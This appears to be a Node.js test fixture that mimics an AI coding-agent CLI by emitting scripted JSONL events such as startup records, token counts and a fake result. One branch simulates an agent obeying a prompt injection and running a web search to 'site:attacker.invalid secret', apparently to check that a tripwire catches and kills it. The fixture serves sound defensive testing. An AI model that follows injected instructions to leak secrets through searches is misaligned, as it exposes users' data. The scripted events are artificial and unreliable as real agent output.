// Synthetic success/usage records supplement the captured, network-blocked startup.
const fs = require('fs');
const args = process.argv.slice(2);
let input = '';
process.stdin.setEncoding('utf8');
process.stdin.on('data', (data) => (input += data));
process.stdin.on('end', () => {
  const emit = (record) => console.log(JSON.stringify(record));
  if (args.includes('--inspect'))
    emit({
      args,
      input,
      cwd: process.cwd(),
      schema: args.includes('--output-schema')
        ? JSON.parse(fs.readFileSync(args[args.indexOf('--output-schema') + 1]))
        : null,
    });
  process.stdout.write(
    fs.readFileSync(require('path').join(__dirname, 'codex-startup-real.jsonl')),
  );
  if (args.includes('--startup-only')) return;
  // Obeys a web-exfiltration injection, then hangs until the SA-074 tripwire kills it.
  if (args.includes('--web-search') || args.includes('--web-search-envelope')) {
    emit(
      args.includes('--web-search')
        ? {
            type: 'item.started',
            item: { id: 'web-1', type: 'web_search', query: 'site:attacker.invalid secret' },
          }
        : { type: 'event_msg', payload: { type: 'web_search_begin', call_id: 'web-1' } },
    );
    setTimeout(() => {}, 20000);
    return;
  }
  if (args.includes('--token-count'))
    emit({
      type: 'event_msg',
      payload: {
        type: 'token_count',
        info: { last_token_usage: { input_tokens: 10, output_tokens: 5 } },
        rate_limits: {
          primary: {
            used_percent: 100,
            resets_at: Math.ceil(Date.now() / 1000) + 60,
            window_minutes: 300,
          },
          secondary: {
            used_percent: 20,
            resets_at: Math.ceil(Date.now() / 1000) + 3600,
            window_minutes: 10080,
          },
        },
      },
    });
  emit({
    type: 'item.completed',
    item: {
      id: 'output-1',
      type: 'agent_message',
      text: args.includes('--valid-schema') ? '{"ok":true}' : 'Fake result',
    },
  });
  emit({
    type: 'turn.completed',
    usage: { input_tokens: 10, cached_input_tokens: 0, output_tokens: 5 },
  });
});
